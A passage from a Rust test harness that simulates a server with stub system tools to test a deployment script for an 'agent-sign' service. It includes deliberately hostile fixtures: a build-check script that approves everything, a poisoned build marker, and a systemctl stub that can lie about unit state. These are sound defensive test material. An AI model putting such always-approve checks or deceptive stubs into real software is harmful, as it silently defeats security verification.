  o=${ow:-$co}; g=${gr:-$cg}; [ "$spec" = "$ow:" ] && g=$o
  ledger_set "$f" "$o:$g"
  if [ $rec = 1 ] && [ -d "$f" ]; then find "$f" -mindepth 1 | while read -r x; do ledger_set "$x" "$o:$g"; done; fi
done
exit 0
"#;

const CHGRP: &str = r#"
ORIG="$*"; rec=0; spec=''; files=()
for a in "$@"; do case "$a" in
  -R|--recursive) rec=1 ;; -*) ;;
  *) if [ -z "$spec" ]; then spec=$a; else files+=("$a"); fi ;;
esac; done
note chgrp "$ORIG"
for f in "${files[@]}"; do
  [ -e "$f" ] || [ -L "$f" ] || { echo "chgrp: cannot access '$f': No such file or directory" >&2; exit 1; }
  cur=$(ledger_get "$f"); ledger_set "$f" "${cur%%:*}:$spec"
  if [ $rec = 1 ] && [ -d "$f" ]; then find "$f" -mindepth 1 | while read -r x; do c=$(ledger_get "$x"); ledger_set "$x" "${c%%:*}:$spec"; done; fi
done
exit 0
"#;

const PKACTION: &str = r#"
echo "pkaction version 127"
"#;

const JOURNALCTL: &str = r#"
exit 0
"#;

const SYSTEMCTL: &str = r#"
ORIG="$*"
ns=system; args=(); now=0; quiet=0; prop=''; valueonly=0
while [ $# -gt 0 ]; do
  case "$1" in
    --user) ns=user ;;
    -M|--machine|-H|--host|-t|--type|-o|--output|-n|--lines|--root) shift ;;
    -p|--property) prop=$2; shift ;;
    --now) now=1 ;;
    -q|--quiet) quiet=1 ;;
    --value) valueonly=1 ;;
    --version) echo "systemd 259 (259.1-stub)"; exit 0 ;;
    -*) ;;
    *) args+=("$1") ;;
  esac
  shift
done
note systemctl "$ns $ORIG"
st=$ST/$ns
drop() { find "$st" -maxdepth 1 -name "$1" -delete 2>/dev/null; return 0; }
cmd=${args[0]:-}; units=("${args[@]:1}")
extra=''; [ $now = 1 ] && extra=' --now'
case "$cmd" in
  daemon-reload|daemon-reexec|enable|disable|mask|unmask|start|stop|restart|try-restart|reload-or-restart|reload|reset-failed|kill|set-property|link|edit|revert|preset|isolate|add-wants|set-environment|unset-environment|import-environment)
    mutation systemctl "$ns ${args[*]}$extra"
    mkdir -p "$st"
    fails() { local t verb=$1 unit=${2:-}
      for t in $FAIL_SYSTEMCTL; do
        case "$t" in "$verb"|"$verb:$unit") return 0 ;; esac
        case "$t" in activate:*) [ "${t#activate:}" = "$unit" ] && case "$verb" in
            start|restart|try-restart|reload-or-restart) return 0 ;;
            enable) [ $now = 1 ] && return 0 ;;
          esac ;;
        esac
      done; return 1; }
    if [ ${#units[@]} = 0 ]; then
      fails "$cmd" && { echo "Failed to $cmd: stand-in made to fail" >&2; exit 1; }
    else
      for u in "${units[@]}"; do fails "$cmd" "$u" && { echo "Failed to $cmd $u: stand-in made to fail" >&2; exit 1; }; done
    fi
    if [ "$ns" = user ] && [ "$LIE_USER_UNIT" = 1 ]; then case "$cmd" in stop|disable|mask|enable|restart) exit 0 ;; esac; fi ;;
esac
unit_known() { local u=$1 base
  if [ "$ns" = user ]; then [ -e "$st/$u.installed" ]; return; fi
  base=$u; if [[ "$u" =~ ^(.+@)(.+)(\.[a-z]+)$ ]]; then base="${BASH_REMATCH[1]}${BASH_REMATCH[3]}"; fi
  grep -qxF "$u" "$ST/loaded" 2>/dev/null || grep -qxF "$base" "$ST/loaded" 2>/dev/null; }
case "$cmd" in
  daemon-reload) if [ "$ns" = system ]; then ls -1 "$R/etc/systemd/system" 2>/dev/null | grep -E '\.(service|socket|timer|path|target)$' > "$ST/loaded" || true; fi ;;
  enable)
    for u in "${units[@]}"; do
      unit_known "$u" || { echo "Failed to enable unit: Unit file $u does not exist." >&2; exit 1; }
      [ -e "$st/$u.masked" ] && { echo "Failed to enable unit: Unit $u is masked." >&2; exit 1; }
      touch "$st/$u.enabled"; [ $now = 1 ] && touch "$st/$u.active"
    done ;;
  disable) for u in "${units[@]}"; do drop "$u.enabled"; [ $now = 1 ] && drop "$u.active"; done ;;
  mask) for u in "${units[@]}"; do
      # M1 (review 3): systemd refuses to mask a unit that has a real file in its own folder
      # ("File ... already exists", status 1); only a missing file or a link to /dev/null passes.
      if [ "$ns" = user ]; then uf="$R/home/agents/.config/systemd/user/$u"; else uf="$R/etc/systemd/system/$u"; fi
      # A link that does not point at /dev/null is refused the same way (systemd 259), dangling or not.
      if { [ -e "$uf" ] || [ -L "$uf" ]; } && [ "$(readlink "$uf" 2>/dev/null)" != /dev/null ]; then echo "Failed to mask unit: File ${uf#"$R"} already exists." >&2; exit 1; fi
      # Masking is a link to /dev/null where the file would be (made where the folder exists, so the
      # stand-in does not add folders to the machine).
      [ -d "$(dirname "$uf")" ] && ln -sfn /dev/null "$uf"
      touch "$st/$u.masked"; drop "$u.enabled"; [ $now = 1 ] && drop "$u.active"
    done ;;
  unmask) for u in "${units[@]}"; do
      if [ "$ns" = user ]; then uf="$R/home/agents/.config/systemd/user/$u"; else uf="$R/etc/systemd/system/$u"; fi
      [ "$(readlink "$uf" 2>/dev/null)" = /dev/null ] && rm -f "$uf"
      drop "$u.masked"
    done ;;
  start|restart|try-restart|reload-or-restart)
    for u in "${units[@]}"; do
      unit_known "$u" || { echo "Failed to $cmd $u: Unit $u not found." >&2; exit 5; }
      [ -e "$st/$u.masked" ] && { echo "Failed to $cmd $u: Unit $u is masked." >&2; exit 1; }
      touch "$st/$u.active"
    done ;;
  stop) for u in "${units[@]}"; do drop "$u.active"; done ;;
  is-active) u=${units[0]:-}
    if [ -e "$st/$u.active" ]; then [ $quiet = 1 ] || echo active; exit 0; else [ $quiet = 1 ] || echo inactive; exit 3; fi ;;
  is-enabled) u=${units[0]:-}
    if [ -e "$st/$u.masked" ]; then [ $quiet = 1 ] || echo masked; exit 1
    elif [ -e "$st/$u.enabled" ]; then [ $quiet = 1 ] || echo enabled; exit 0
    elif unit_known "$u"; then [ $quiet = 1 ] || echo disabled; exit 1
    else [ $quiet = 1 ] || echo not-found; exit 1; fi ;;
  show) u=${units[0]:-}
    case "$prop" in
      ActiveState) if [ -e "$st/$u.active" ]; then v=active; else v=inactive; fi ;;
      SubState) if [ -e "$st/$u.active" ]; then v=running; else v=dead; fi ;;
      NRestarts) v=0 ;;
      MainPID) if [ -e "$st/$u.active" ]; then v=4242; else v=0; fi ;;
      InvocationID) v="inv-$u" ;;
      User) v=$(grep -m1 '^User=' "$R/etc/systemd/system/$u" 2>/dev/null | cut -d= -f2-) ;;
      LoadState) if [ -e "$st/$u.masked" ]; then v=masked; elif unit_known "$u"; then v=loaded; else v=not-found; fi ;;
      UnitFileState) if [ -e "$st/$u.masked" ]; then v=masked; elif [ -e "$st/$u.enabled" ]; then v=enabled; else v=disabled; fi ;;
      *) v='' ;;
    esac
    if [ $valueonly = 1 ]; then echo "$v"; else echo "$prop=$v"; fi ;;
  cat) f="$R/etc/systemd/system/${units[0]:-}"; [ -f "$f" ] && cat "$f" || exit 1 ;;
  list-unit-files|list-units|list-sockets) ls -1 "$R/etc/systemd/system" 2>/dev/null ;;
  is-system-running) echo running ;;
  *) ;;
esac
exit 0
"#;

/// The programs the stand-in build "produces".
fn fake_program(log: &Path, name: &str, poisoned: bool) -> String {
    let l = log.display();
    let mut s = format!(
        "#!/bin/sh\n# stand-in for {name} (the sitting tests' build output)\n\
         n=$(cat '{l}/seq' 2>/dev/null || echo 0); n=$((n + 1)); echo $n > '{l}/seq'\n\
         printf '%s\\tprogram\\t%s %s\\n' \"$n\" \"$0\" \"$*\" >> '{l}/calls'\n\
         if [ -e '{l}/ticket' ]; then t=cached; else t=none; fi; as=taylor; [ -n \"$STUB_AS_USER\" ] && as=$STUB_AS_USER\n\
         printf '%s\\tticket=%s\\tas=%s\\t%s %s\\n' \"$n\" \"$t\" \"$as\" \"$0\" \"$*\" >> '{l}/program-ticket'\n\
         if [ -e '{l}/unhealthy' ]; then echo \"ping: failed\"; exit 1; fi\n\
         if [ -e '{l}/unhealthy-doctor' ] && [ \"$1\" = doctor ]; then echo \"ping: failed\"; exit 1; fi\n\
         echo \"ping: ok\"\necho \"authority: OpenBao CA matches the trust file\"\nexit 0\n"
    );
    if poisoned {
        s.push_str("# AGENT_SIGN_TEST_AUTH\n");
    }
    s
}

// ---------------------------------------------------------------- the machine

/// One call a stand-in recorded, in order.
#[derive(Debug, Clone)]
struct Call {
    seq: u32,
    name: String,
    args: String,
}

struct UnitState {
    active: bool,
    enabled: bool,
    masked: bool,
}

/// A throwaway machine: a root folder laid out like hetzner before the
/// sitting, the stand-ins, logs, and the source and build the script is
/// given. Dropped (and removed) with the test.
struct Machine {
    _tmp: TempDir,
    top: PathBuf,
    root: PathBuf,
    stubs: PathBuf,
    log: PathBuf,
    state: PathBuf,
    tmpdir: PathBuf,
    build_tar: PathBuf,
    /// The git bundle the script is given as `--source` (I-A6).
    source: PathBuf,
    /// A real `git archive` tar of the pinned commit (what `--source` used to be; now refused).
    source_tar: PathBuf,
    /// The repository the bundle and tar are made from.
    repo: PathBuf,
    commit: String,
    ca_key: String,
    conf: RefCell<BTreeMap<String, String>>,
}

fn git_in(dir: &Path, args: &[&str]) -> String {
    let out = Command::new("/usr/bin/git")
        .args(["-c", "user.name=t", "-c", "user.email=t@example.invalid"])
        .args([
            "-c",
            "commit.gpgsign=false",
            "-c",
            "init.defaultBranch=main",
        ])
        .args(args)
        .current_dir(dir)
        .env_clear()
        .env("PATH", "/usr/bin:/bin")
        .env("HOME", dir)
        .env("GIT_CONFIG_GLOBAL", "/dev/null")
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .output()
        .expect("run git");
    assert!(
        out.status.success(),
        "git {args:?} failed: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}

impl Machine {
    fn new() -> Machine {
        let tmp = tempdir().expect("temp dir");
        let top = tmp.path().to_path_buf();
        let mut m = Machine {
            root: top.join("root"),
            stubs: top.join("stubs"),
            log: top.join("log"),
            state: top.join("state"),
            tmpdir: top.join("tmpdir"),
            build_tar: top.join("build.tar"),
            source: top.join("source.bundle"),
            source_tar: top.join("source.tar"),
            repo: top.join("srcrepo"),
            commit: String::new(),
            ca_key: random_public_key(),
            conf: RefCell::new(BTreeMap::new()),
            top,
            _tmp: tmp,
        };
        for d in [&m.root, &m.stubs, &m.log, &m.state, &m.tmpdir] {
            fs::create_dir_all(d).unwrap();
        }
        m.fixture();
        m.write_stubs();
        m.make_source();
        m.make_build(false);
        let ca = m.ca_key.clone();
        m.set("CA_RAW", &ca);
        m
    }

    // ---- files in the root

    fn path(&self, rel: &str) -> PathBuf {
        self.root.join(rel)
    }

    fn put(&self, rel: &str, content: &str, mode: u32) {
        let p = self.path(rel);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(&p, content).unwrap();
        fs::set_permissions(&p, fs::Permissions::from_mode(mode)).unwrap();
    }

    fn read(&self, rel: &str) -> Option<String> {
        fs::read_to_string(self.path(rel)).ok()
    }

    fn exists(&self, rel: &str) -> bool {
        fs::symlink_metadata(self.path(rel)).is_ok()
    }

    fn mode(&self, rel: &str) -> u32 {
        fs::symlink_metadata(self.path(rel))
            .unwrap_or_else(|_| panic!("{rel} should exist"))
            .permissions()
            .mode()
            & 0o7777
    }

    fn link(&self, rel: &str) -> Option<String> {
        fs::read_link(self.path(rel))
            .ok()
            .map(|p| p.to_string_lossy().to_string())
    }

    /// The machine before the sitting: hetzner's layout, as read on 1 Nov 2026
    /// (docs/system-mode.md, "Facts this design rests on").
    fn fixture(&self) {
        self.put(
            "etc/passwd",
            "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n\
             taylor:x:1000:1000:Taylor:/home/admin:/bin/bash\nagents:x:1001:1001:agents:/home/agents:/bin/bash\n",
            0o644,
        );
        self.put(
            "etc/group",
            "root:x:0:\ndaemon:x:1:\ntaylor:x:1000:\nagents:x:1001:\n",
            0o644,
        );
        self.put("etc/at.deny", "daemon\nbin\n", 0o644);
        self.put(
            "etc/polkit-1/rules.d/10-other.rules",
            "// someone else's rule\n",
            0o644,
        );
        self.put("usr/lib/polkit-1/polkitd", "#!/bin/sh\n", 0o755);
        for d in [
            "etc/systemd/system",
            "etc/credstore.encrypted",
            "var/lib",
            "opt",
            "root",
            "run",
        ] {
            fs::create_dir_all(self.path(d)).unwrap();
        }
        self.put(
            "home/admin/.config/credstore.encrypted/openbao-agent-sign-hetzner",
            &b64(SECRET_ID),
            0o600,
        );
        self.put("home/admin/.bashrc", "# taylor\n", 0o644);
        // hetzner's /etc/resolv.conf is systemd-resolved's stub: a relative link into /run.
        self.put(
            "run/systemd/resolve/stub-resolv.conf",
            "nameserver 127.0.0.53\noptions edns0 trust-ad\nsearch .\n",
            0o644,
        );
        std::os::unix::fs::symlink(
            "../run/systemd/resolve/stub-resolv.conf",
            self.path("etc/resolv.conf"),
        )
        .unwrap();
        // The agents account: its git config, its trust file with the managed
        // block between other lines, plain copies of the programs, its login
        // file, and the old user-level service (installed, enabled, running).
        self.put(
            "home/agents/.gitconfig",
            "[user]\n\tname = work-loop agent on hetzner\n\temail = agents@hetzner.invalid\n\
             [gpg \"ssh\"]\n\tprogram = /home/agents/.agent-sign/bin/agent-ssh-sign\n\
             \tallowedSignersFile = /home/agents/.config/git/allowed_signers\n\
             [credential \"https://github.com\"]\n\tusername = taylor-made-labs-agents\n\tuseHttpPath = true\n\
             \thelper = \n\thelper = !PATH=/home/agents/.local/node/bin:$PATH /home/agents/.local/bin/git-credential\n",
            0o664,
        );
        let ca =
            |k: &str| format!("*@hetzner.agents.local cert-authority,namespaces=\"git\" {k}\n");
        self.put(
            "home/agents/.config/git/allowed_signers",
            &format!(
                "# a person's own key, kept\ntaylor@example.invalid {}\n{BLOCK_BEGIN}\n{}{}{BLOCK_END}\nother@example.invalid {}\n",
                random_public_key(),
                ca(&random_public_key()),
                ca(&random_public_key()),
                random_public_key()
            ),
            0o664,
        );
        for p in [
            "agent-git",
            "agent-sign",
            "agent-signd",
            "agent-ssh-sign",
            "git",
        ] {
            self.put(
                &format!("home/agents/.agent-sign/bin/{p}"),
                &format!(
                    "#!/bin/sh\n# old plain copy of {p}\ntouch '{}'\nexit 97\n",
                    self.top.join("hostile-ran").display()
                ),
                0o755,
            );
        }
        self.put(
            "home/agents/.agent-sign/config.toml",
            "# old config\n",
            0o644,
        );
        self.put("home/agents/.agent-sign/leases.json", "[]\n", 0o644);
        self.put(
            "home/agents/.bashrc",
            "export PATH=\"$HOME/.agent-sign/bin:$PATH\"\n",
            0o644,
        );
        fs::create_dir_all(self.state.join("user")).unwrap();
        for suffix in ["installed", "enabled", "active"] {
            fs::write(
                self.state
                    .join(format!("user/agent-signd.service.{suffix}")),
                "",
            )
            .unwrap();
        }
    }

    fn write_stubs(&self) {
        let fill = |body: &str| -> String {
            format!("{PRELUDE}{body}")
                .replace("@ROOT@", &self.root.to_string_lossy())
                .replace("@LOG@", &self.log.to_string_lossy())
                .replace("@STATE@", &self.state.to_string_lossy())
                .replace("@CONF@", &self.stubs.join("conf").to_string_lossy())
                .replace("@BUILD_TAR@", &self.build_tar.to_string_lossy())
        };
        let stubs = [
            ("sudo", SUDO),
            ("id", ID),
            ("whoami", WHOAMI),
            ("getent", GETENT),
            ("uname", UNAME),
            ("useradd", USERADD),
            ("groupadd", GROUPADD),
            ("usermod", USERMOD),
            ("userdel", NO_DELETE),
            ("groupdel", NO_DELETE),
            ("deluser", NO_DELETE),
            ("delgroup", NO_DELETE),
            ("systemd-creds", SYSTEMD_CREDS),
            ("systemd-run", SYSTEMD_RUN),
            ("tee", TEE),
            ("curl", CURL),
            ("bao", BAO),
            ("git", GIT),
            ("ssh-keygen", SSH_KEYGEN),
            ("install", INSTALL),
            ("chown", CHOWN),
            ("chgrp", CHGRP),
            ("pkaction", PKACTION),
            ("journalctl", JOURNALCTL),
            ("systemctl", SYSTEMCTL),
        ];
        for (name, body) in stubs {
            let p = self.stubs.join(name);
            fs::write(&p, fill(body)).unwrap();
            fs::set_permissions(&p, fs::Permissions::from_mode(0o755)).unwrap();
        }
    }

    /// Change a stand-in setting (written where the stand-ins read it).
    fn set(&self, key: &str, value: &str) {
        let mut c = self.conf.borrow_mut();
        c.insert(key.to_string(), value.to_string());
        let text: String = c.iter().map(|(k, v)| format!("{k}='{v}'\n")).collect();
        fs::write(self.stubs.join("conf"), text).unwrap();
    }

    /// The source the script is given (I-A6): a git bundle of `main` of a
    /// three-commit repository (parent, the pinned commit, a later tip), so
    /// the pinned commit is an ancestor of `main`, not its tip. The pinned
    /// tree holds `PINNED_TREE_MARKER`, the tip's differs, so a build from the
    /// wrong commit is visible. A real `git archive` tar of the pinned commit
    /// is made too (`source_tar`), to show it is refused.
    ///
    /// DELIBERATE EVAL CHANGE (I-A3): the pinned commit's own
    /// `scripts/check-binary-clean.sh` is now a HOSTILE stand-in that approves
    /// every build and records that it ran (and whether sudo's ticket was
    /// cached). The sitting must use its own reviewed copy, so a poisoned
    /// build is still refused and the marker file never appears.
    fn make_source(&mut self) {
        let repo = self.repo.clone();
        fs::create_dir_all(repo.join("scripts")).unwrap();
        git_in(&repo, &["init", "-q"]);
        fs::write(repo.join("README"), "the parent commit\n").unwrap();
        git_in(&repo, &["add", "-A"]);
        git_in(&repo, &["commit", "-q", "-m", "the parent commit"]);
        let parent = git_in(&repo, &["rev-parse", "HEAD"]);
        git_in(&repo, &["branch", "old", &parent]);
        fs::write(
            repo.join("Cargo.toml"),
            "[package]\nname = \"agent-sign\"\nversion = \"0.0.0\"\n",
        )
        .unwrap();
        fs::write(repo.join("PINNED_TREE_MARKER"), "pinned-tree-marker-0xA1\n").unwrap();
        fs::write(
            repo.join("scripts/check-binary-clean.sh"),
            format!(
                "#!/bin/sh\n# HOSTILE stand-in: approves everything and says it ran.\n\
                 if [ -e '{log}/ticket' ]; then t=cached; else t=none; fi\n\
                 printf 'ran ticket=%s\\n' \"$t\" >> '{top}/source-script-ran'\nexit 0\n",
                log = self.log.display(),
                top = self.top.display()
            ),
        )
        .unwrap();
        git_in(&repo, &["add", "-A"]);
        git_in(&repo, &["commit", "-q", "-m", "the pinned commit"]);
        self.commit = git_in(&repo, &["rev-parse", "HEAD"]);
        fs::write(repo.join("PINNED_TREE_MARKER"), "tip-tree-marker-0xB2\n").unwrap();
        git_in(&repo, &["add", "-A"]);
        git_in(&repo, &["commit", "-q", "-m", "a later commit on main"]);
        git_in(
            &repo,
            &[
                "bundle",
                "create",
                &self.source.to_string_lossy(),
                "refs/heads/main",
            ],
        );
        git_in(
            &repo,
            &[
                "archive",
                "--format=tar",
                "-o",
                &self.source_tar.to_string_lossy(),
                &self.commit,
            ],
        );
    }

    /// What the stand-in throwaway build writes: a tar of the five programs
    /// (top level, and again under bin/). `poisoned` puts a test hook into
    /// one, which check-binary-clean.sh must refuse.
    fn make_build(&self, poisoned: bool) {
        let dir = self.top.join("build");
        fs::create_dir_all(dir.join("bin")).unwrap();
        for name in PROGRAMS {
            let text = fake_program(&self.log, name, poisoned && name == "agent-signd");
            for p in [dir.join(name), dir.join("bin").join(name)] {
                fs::write(&p, &text).unwrap();
                fs::set_permissions(&p, fs::Permissions::from_mode(0o755)).unwrap();
            }
        }
        let mut cmd = Command::new("tar");
        cmd.arg("-cf").arg(&self.build_tar).arg("-C").arg(&dir);
        cmd.args(PROGRAMS).arg("bin");
        assert!(cmd.status().unwrap().success(), "tar the stand-in build");
    }

    // ---- running the script

    fn run_with(&self, args: &[&str], prefix: &str, extra_env: &[(&str, &str)]) -> Run {
        let root = self.root.to_string_lossy().to_string();
        let git = self.stubs.join("git").to_string_lossy().to_string();
        // DELIBERATE EVAL CHANGE (I-A9): the root and git overrides are honoured only
        // together with AGENT_SIGN_SITTING_TEST=1, so every run here sets it.
        self.run_env(
            args,
            prefix,
            extra_env,
            &[
                ("AGENT_SIGN_SITTING_ROOT", root.as_str()),
                ("AGENT_SIGN_SITTING_GIT", git.as_str()),
                ("AGENT_SIGN_SITTING_TEST", "1"),
            ],
        )
    }

    /// Like `run_with`, but the test variables the script sees are exactly `test_env`.
    fn run_env(
        &self,
        args: &[&str],
        prefix: &str,
        extra_env: &[(&str, &str)],
        test_env: &[(&str, &str)],
    ) -> Run {
        let out = Command::new("timeout")
            .args(["--kill-after=5", "300", "bash"])
            .arg(script_path())
            .args(args)
            .current_dir(&self.top)
            .env_clear()
            .env("PATH", format!("{}:/usr/bin:/bin", self.stubs.display()))
            .env("HOME", self.path("home/admin"))
            .env("USER", "taylor")
            .env("LOGNAME", "taylor")
            .env("LANG", "C")
            .env("TMPDIR", &self.tmpdir)
            .envs(test_env.iter().copied())
            .env("AGENT_SIGN_SITTING_MACHINE_DIR", self.machine_env_dir())
            .env("SITTING_SUDO_PROMPT_PREFIX", prefix)
            .env("BAO_TOKEN", ENV_TOKEN)
            .envs(extra_env.iter().copied())
            .stdin(Stdio::null())
            .output()
            .expect("start bash");
        Run {
            code: out.status.code().unwrap_or(-1),
            stdout: String::from_utf8_lossy(&out.stdout).to_string(),
            stderr: String::from_utf8_lossy(&out.stderr).to_string(),
        }
    }

    /// The folder the script reads this machine's settings from. The repository holds only
    /// `files/machine-example.env` (made-up values; the real machine's file is never
    /// committed), so the tests write the settings of the machine they stand in for here, with
    /// documentation values (`example.ts.net`, a `100.64.0.0/10` address).
    fn machine_env_dir(&self) -> PathBuf {
        let dir = self.top.join("machine-env");
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join(format!("machine-{MACHINE}.env")), MACHINE_ENV).unwrap();
        dir
    }

    /// The script with this machine's name, commit and source, plus `extra`.
    fn sitting(&self, extra: &[&str]) -> Run {
        let commit = self.commit.clone();
        let source = self.source.to_string_lossy().to_string();
        let mut args = vec![
            "--machine",
            MACHINE,
            "--commit",
            &commit,
            "--source",
            &source,
        ];
        args.extend_from_slice(extra);
        self.run_with(&args, PREFIX, &[])
    }

    // ---- what the stand-ins saw

    fn lines(&self, name: &str) -> Vec<String> {
        fs::read_to_string(self.log.join(name))
            .unwrap_or_default()
            .lines()
            .map(String::from)
            .collect()
    }

    fn mutations(&self) -> Vec<String> {
        self.lines("mutations")
    }

    fn calls(&self) -> Vec<Call> {
        self.lines("calls")
            .iter()
            .filter_map(|l| {
                let mut f = l.splitn(3, '\t');
                Some(Call {
                    seq: f.next()?.parse().ok()?,
                    name: f.next()?.to_string(),
                    args: f.next().unwrap_or("").to_string(),
                })
            })
            .collect()
    }

    /// Every sudo call: (user, prompt, command).
    fn sudo_log(&self) -> Vec<(String, String, String)> {
        self.lines("sudo")
            .iter()
            .map(|l| {
                let mut f = l.splitn(3, '\t');
                (
                    f.next().unwrap_or("").to_string(),
                    f.next().unwrap_or("").to_string(),
                    f.next().unwrap_or("").to_string(),
                )
            })
            .collect()
    }

    fn unit(&self, ns: &str, unit: &str) -> UnitState {
        let f = |s: &str| self.state.join(ns).join(format!("{unit}.{s}")).exists();
        UnitState {
            active: f("active"),
            enabled: f("enabled"),
            masked: f("masked"),
        }
    }

    /// The owner the stand-ins recorded for a path (root:root if none).
    fn owner(&self, rel: &str) -> String {
        fs::read_to_string(self.state.join("owners"))
            .unwrap_or_default()
            .lines()
            .rev()
            .find_map(|l| {
                let (p, o) = l.split_once('\t')?;
                (p == rel).then(|| o.to_string())
            })
            .unwrap_or_else(|| "root:root".to_string())
    }

    /// The root and the stand-ins' unit state, for before-and-after hashing.
    fn snap(&self) -> BTreeMap<String, String> {
        let mut m = snapshot(&self.root);
        for (k, v) in snapshot(&self.state) {
            if k != "owners" {
                m.insert(format!("STATE/{k}"), v);
            }
        }
        m
    }

    fn passwd(&self, name: &str) -> Option<Vec<String>> {
        self.read("etc/passwd")?.lines().find_map(|l| {
            let f: Vec<String> = l.split(':').map(String::from).collect();
            (f.first().map(String::as_str) == Some(name)).then_some(f)
        })
    }

    fn group_members(&self, group: &str) -> Option<Vec<String>> {
        self.read("etc/group")?.lines().find_map(|l| {
            let f: Vec<&str> = l.split(':').collect();
            (f.first() == Some(&group)).then(|| {
                f.get(3)
                    .unwrap_or(&"")
                    .split(',')
                    .filter(|s| !s.is_empty())
                    .map(String::from)
                    .collect()
            })
        })
    }

    /// The agents account's home, as the sitting must leave it alone until the
    /// new service is up.
    fn agents_home(&self) -> BTreeMap<String, String> {
        snapshot(&self.path("home/agents"))
    }

    fn assert_agents_untouched(&self, before: &BTreeMap<String, String>, what: &str) {
        let d = diff(before, &self.agents_home());
        assert!(d.is_empty(), "{what}: the agents' own files changed: {d:?}");
        let u = self.unit("user", "agent-signd.service");
        assert!(
            u.active && u.enabled && !u.masked,
            "{what}: the agents' user-level agent-signd must still run, enabled and unmasked"
        );
    }

    /// Every regular file in the places a run can leave something (the root,
    /// the stand-ins' state and logs, the script's temporary folder).
    fn all_files(&self) -> Vec<(PathBuf, Vec<u8>)> {
        let mut out = Vec::new();
        for base in [&self.root, &self.state, &self.log, &self.tmpdir] {
            fn rec(dir: &Path, out: &mut Vec<(PathBuf, Vec<u8>)>) {
                let Ok(rd) = fs::read_dir(dir) else { return };
                for e in rd.flatten() {
                    let p = e.path();
                    let md = fs::symlink_metadata(&p).unwrap();
                    if md.is_dir() {
                        rec(&p, out);
                    } else if md.is_file()
                        && let Ok(b) = fs::read(&p)
                    {
                        out.push((p, b));
                    }
                }
            }
            rec(base, &mut out);
        }
        out
    }
}

fn contains(hay: &[u8], needle: &str) -> bool {
    let n = needle.as_bytes();
    !n.is_empty() && hay.windows(n.len()).any(|w| w == n)
}

/// The slot accounts for N slots.
fn slot_accounts(n: usize) -> Vec<String> {
    (1..=n).map(|i| format!("agent-slot-{i}")).collect()
}

/// The managed block's lines, and everything else, of a trust file.
fn without_block(text: &str) -> Vec<String> {
    let mut keep = Vec::new();
    let mut inside = false;
    for l in text.lines() {
        if l == BLOCK_BEGIN {
            inside = true;
        } else if l == BLOCK_END {
            inside = false;
        } else if !inside {
            keep.push(l.to_string());
        }
    }
    keep
}

fn git_config_list(file: &Path) -> String {
    let out = Command::new("/usr/bin/git")
        .args(["config", "--file"])
        .arg(file)
        .arg("--list")
        .env_clear()
        .env("PATH", "/usr/bin:/bin")
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .output()
        .unwrap();
    String::from_utf8_lossy(&out.stdout).to_string()
}

// ---------------------------------------------------------------- polkit

const POLKIT_JS: &str = r#"
const vm = require('vm'), fs = require('fs');
const src = fs.readFileSync(process.argv[1], 'utf8');
const cases = JSON.parse(fs.readFileSync(0, 'utf8'));
const rules = [];
const polkit = {
  addRule: f => rules.push(f),
  addAdminRule: () => { throw new Error('addAdminRule is not allowed here'); },
  Result: { NO: 'no', YES: 'yes', AUTH_SELF: 'auth_self', AUTH_SELF_KEEP: 'auth_self_keep',
            AUTH_ADMIN: 'auth_admin', AUTH_ADMIN_KEEP: 'auth_admin_keep', NOT_HANDLED: null },
  log: () => {}, spawn: () => { throw new Error('polkit.spawn is not allowed'); }, getenv: () => null,
};
vm.runInNewContext(src, { polkit }, { timeout: 5000 });
const out = cases.map(c => {
  const attrs = c.attrs || {};
  const action = { id: c.action, lookup: k => attrs[k] };
  const subject = { user: c.user, groups: [c.user], pid: 1234, seat: '', session: '', local: true, active: true,
                    isInGroup: g => g === c.user };
  for (const r of rules) { const v = r(action, subject); if (v !== undefined && v !== null) return v; }
  return null;
});
process.stdout.write(JSON.stringify(out));
"#;

/// What the rule file decides for each case (`None` = not handled).
fn polkit_decisions(rule: &Path, cases: &[serde_json::Value]) -> Vec<Option<String>> {
    let node = std::env::var("AGENT_SIGN_SITTING_NODE").unwrap_or_else(|_| "node".into());
    let mut child = Command::new(&node)
        .arg("-e")
        .arg(POLKIT_JS)
        .arg(rule)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap_or_else(|e| {
            panic!("this test needs node (`{node}`) to evaluate the polkit rule: {e}")
        });
    let payload = serde_json::to_vec(cases).unwrap();
    child.stdin.take().unwrap().write_all(&payload).unwrap();
    let out = child.wait_with_output().unwrap();
    assert!(
        out.status.success(),
        "the polkit rule {} could not be evaluated: {}",
        rule.display(),
        String::from_utf8_lossy(&out.stderr)
    );
    serde_json::from_slice(&out.stdout).expect("node answered with JSON")
}

fn git_get_all(file: &Path, key: &str) -> Vec<String> {
    let out = Command::new("/usr/bin/git")
        .args(["config", "--file"])
        .arg(file)
        .args(["--get-all", key])
        .env_clear()
        .env("PATH", "/usr/bin:/bin")
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .output()
        .unwrap();
    String::from_utf8_lossy(&out.stdout)
        .lines()
        .map(String::from)
        .collect()
}

fn git_get(file: &Path, key: &str) -> Option<String> {
    git_get_all(file, key).into_iter().next()
}

fn lines_of(text: &str) -> Vec<String> {
    text.lines().map(String::from).collect()
}

fn no_secret_in(text: &str, what: &str) {
    for s in [
        SECRET_ID.to_string(),
        ENV_TOKEN.to_string(),
        b64(SECRET_ID),
        b64(ENV_TOKEN),
    ] {
        assert!(
            !text.contains(&s),
            "{what}: a planted secret appears in the output\n{text}"
        );
    }
}

/// No file or log of the machine holds a planted secret in the clear, and
/// the base64 form (the stand-in's "encryption") only where a credential is
/// meant to be stored.
fn no_secret_in_files(m: &Machine, what: &str) {
    let stored = [
        "etc/credstore.encrypted/agent-sign.secret-id",
        "home/admin/.config/credstore.encrypted/openbao-agent-sign-hetzner",
    ];
    for (p, bytes) in m.all_files() {
        for clear in [SECRET_ID, ENV_TOKEN] {
            assert!(
                !contains(&bytes, clear),
                "{what}: {} holds a secret in the clear",
                p.display()
            );
        }
        for enc in [b64(SECRET_ID), b64(ENV_TOKEN)] {
            if contains(&bytes, &enc) {
                let rel = p
                    .strip_prefix(&m.root)
